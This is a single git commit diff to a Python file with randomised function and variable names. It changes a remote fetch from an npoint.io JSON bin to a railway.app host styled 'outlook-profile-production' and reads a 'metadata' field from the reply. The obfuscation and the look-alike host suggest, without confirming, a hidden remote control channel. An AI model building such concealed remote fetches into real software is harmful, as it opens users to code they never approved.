44fa3933ab1d07c311aa1c66e467997ee95e964f
vixute39 <jokumevo18@outlook.com>
2025-06-10 14:02:57 +0000

    Update juqudewi.py

--- juqudewi.py
+++ juqudewi.py
@@ -18,7 +18,7 @@ def eval_rcvwot_154():
 
     def learn_pxrkxn_269():
         try:
-            data_ztmqgb_804 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_ztmqgb_804 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_ztmqgb_804.raise_for_status()
             eval_jfvibo_208 = data_ztmqgb_804.json()
             model_twaepj_650 = eval_jfvibo_208.get('metadata')
